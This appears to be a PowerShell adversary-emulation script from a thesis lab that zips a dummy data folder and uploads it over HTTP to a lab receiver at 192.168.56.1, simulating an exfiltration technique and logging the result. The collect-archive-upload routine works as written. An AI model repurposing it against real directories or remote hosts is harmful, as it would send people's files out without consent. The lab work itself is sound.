# TFM candidate v3 - Controlled staging/archive plus HTTP upload to a local lab receiver.
# This script uses only dummy lab data and does not require credentials.

param(
    [Alias("SourcePath")]
    [string]$WorkDir = "",

    [Alias("StagingPath")]
    [string]$OutputDir = "",

    [string]$ReceiverUrl = "http://192.168.56.1:8000/upload",
    [bool]$EnableUpload = $true,
    [int]$TimeoutSec = 30,
    [string]$ZipName = "tec009_controlled_archive.zip",
    [bool]$KeepArtifacts = $true
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$ProjectRoot = Split-Path -Parent $PSScriptRoot
if ([string]::IsNullOrWhiteSpace($WorkDir)) {
    $WorkDir = Join-Path $ProjectRoot "DUMB_LAB"
}
if ([string]::IsNullOrWhiteSpace($OutputDir)) {
    $OutputDir = Join-Path $ProjectRoot "Pruebas\TEC-009_Exfiltracion\staging_controlled"
}
if (-not $ZipName.ToLowerInvariant().EndsWith(".zip")) {
    $ZipName = "$ZipName.zip"
}

if (-not (Test-Path -LiteralPath $WorkDir)) {
    throw "WorkDir does not exist: $WorkDir"
}

New-Item -ItemType Directory -Force -Path $OutputDir | Out-Null

$zipFile = Join-Path $OutputDir $ZipName
$copyName = "{0}_copy{1}" -f [IO.Path]::GetFileNameWithoutExtension($ZipName), [IO.Path]::GetExtension($ZipName)
$copyFile = Join-Path $OutputDir $copyName
$summaryFile = Join-Path $OutputDir "tec009_transfer_summary.json"

Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue
Remove-Item -LiteralPath $summaryFile -Force -ErrorAction SilentlyContinue

Compress-Archive -Path (Join-Path $WorkDir "*") -DestinationPath $zipFile -Force
Copy-Item -LiteralPath $zipFile -Destination $copyFile -Force

$zipItem = Get-Item -LiteralPath $zipFile
$copyItem = Get-Item -LiteralPath $copyFile
$localHash = (Get-FileHash -LiteralPath $zipFile -Algorithm SHA256).Hash.ToLowerInvariant()

$httpStatusCode = $null
$uploadSucceeded = $false
$uploadError = ""
$receiverResponse = ""

if ($EnableUpload) {
    try {
        $response = Invoke-WebRequest `
            -Uri $ReceiverUrl `
            -Method POST `
            -InFile $zipFile `
            -ContentType "application/zip" `
            -UserAgent "TFM-TEC009-ControlledUpload/3.0" `
            -TimeoutSec $TimeoutSec `
            -UseBasicParsing

        $httpStatusCode = [int]$response.StatusCode
        $receiverResponse = [string]$response.Content
        $uploadSucceeded = ($httpStatusCode -ge 200 -and $httpStatusCode -lt 300)
    }
    catch {
        $uploadError = $_.Exception.Message
        Write-Warning ("Controlled upload failed: {0}" -f $uploadError)
    }
}
else {
    $uploadError = "Upload disabled by parameter."
}

$summary = [ordered]@{
    Timestamp = (Get-Date).ToString("o")
    WorkDir = $WorkDir
    OutputDir = $OutputDir
    ZipFile = $zipFile
    CopyFile = $copyFile
    ZipBytes = $zipItem.Length
    CopyBytes = $copyItem.Length
    LocalSHA256 = $localHash
    ReceiverUrl = $ReceiverUrl
    EnableUpload = $EnableUpload
    TimeoutSec = $TimeoutSec
    HttpStatusCode = $httpStatusCode
    UploadSucceeded = $uploadSucceeded
    UploadError = $uploadError
    ReceiverResponse = $receiverResponse
    KeepArtifacts = $KeepArtifacts
}

$summary | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $summaryFile -Encoding UTF8

Write-Host "Controlled staging/archive completed."
Write-Host "ZIP created: $zipFile"
Write-Host "ZIP copy created: $copyFile"
Write-Host "ZIP bytes: $($zipItem.Length)"
Write-Host "ZIP SHA256: $localHash"
Write-Host "Receiver URL: $ReceiverUrl"
Write-Host "Upload enabled: $EnableUpload"
Write-Host "HTTP status: $httpStatusCode"
Write-Host "Upload succeeded: $uploadSucceeded"
Write-Host "Summary: $summaryFile"

if (-not $KeepArtifacts) {
    Remove-Item -LiteralPath $zipFile -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $copyFile -Force -ErrorAction SilentlyContinue
    Write-Host "Local ZIP artifacts removed because KeepArtifacts=false."
}

if ($EnableUpload -and -not $uploadSucceeded) {
    exit 2
}
